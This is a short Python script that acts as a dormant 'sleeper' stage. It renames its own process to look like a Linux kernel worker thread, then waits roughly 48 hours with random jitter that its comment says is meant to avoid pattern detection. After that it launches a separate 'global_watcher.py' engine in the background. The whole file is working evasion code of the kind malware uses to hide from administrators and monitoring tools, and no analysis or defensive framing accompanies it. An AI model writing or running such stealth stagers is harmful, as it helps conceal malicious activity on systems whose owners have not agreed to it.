import time
import random
import os

# 48-hour Burn-In with 10% Jitter to avoid pattern detection
BURN_IN_SECONDS = 172800 + random.randint(-17280, 17280)

def activate_sleeper():
    print(f"[*] [SLEEPER] Entering dormancy for {BURN_IN_SECONDS/3600:.2f} hours...")
    # Hide process name immediately
    import ctypes
    libc = ctypes.CDLL('libc.so.6')
    buf = ctypes.create_string_buffer(b'[kworker/u33:15]')
    libc.prctl(15, ctypes.byref(buf), 0, 0, 0)
    
    # Passive Observation Phase
    time.sleep(BURN_IN_SECONDS)
    
    # Wake up and trigger the main engine
    print("[!] [SLEEPER] Burn-in complete. Engaging 12th Name logic.")
    os.system("python3 global_watcher.py &")

if __name__ == "__main__":
    activate_sleeper()
